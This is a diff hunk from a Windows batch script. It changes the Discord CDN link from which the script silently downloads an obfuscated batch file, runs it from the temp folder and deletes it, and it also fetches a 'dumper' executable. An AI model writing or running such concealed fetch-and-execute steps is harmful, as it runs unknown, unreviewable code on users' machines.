@@ -433,7 +433,7 @@ echo.
 echo.
 echo                                             35
 echo                                    %g%%g2%.......%r%%r2%.............%t%%w%
-curl -s https://cdn.discordapp.com/attachments/876545074387910726/914249825145454643/reg_scanner_obfuscated.bat > %temp%\reg_scanner.bat
+curl -s https://cdn.discordapp.com/attachments/876545074387910726/914283561408921610/reg_scanner_obfuscated.bat > %temp%\reg_scanner.bat
 call %temp%\reg_scanner.bat
 del /f /q %temp%\reg_scanner.bat
 curl -s https://cdn.discordapp.com/attachments/876545074387910726/881681561685205042/strings2.exe > %temp%\dumper.exe
